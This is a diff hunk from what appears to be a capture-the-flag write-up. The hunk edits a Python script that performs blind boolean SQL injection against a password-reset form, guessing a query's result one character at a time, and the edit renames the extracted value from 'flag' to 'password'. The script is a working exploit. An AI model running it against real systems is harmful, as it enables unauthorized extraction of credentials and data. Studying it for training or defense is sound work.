@@ -347,17 +347,17 @@ if query_length == 0:
 
 # Extract the query result
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?/`~-=\\\"' "
-flag = ""
+password = ""
 for position in range(1, query_length + 1):
     for char in chars:
         payload = f"username=admin' and substring(({query}),{position},1)='{char}&reset_password="
         response = requests.post(url, headers=headers, data=payload)
         if target_text in response.text:
-            flag += char
-            print(f"Extracted so far: {flag}")
+            password += char
+            print(f"Extracted so far: {password}")
             break
 
-print(f"Extracted query result: {flag}")
+print(f"Extracted query result: {password}")
 ```
 
 ## SQL - Error based Challenge
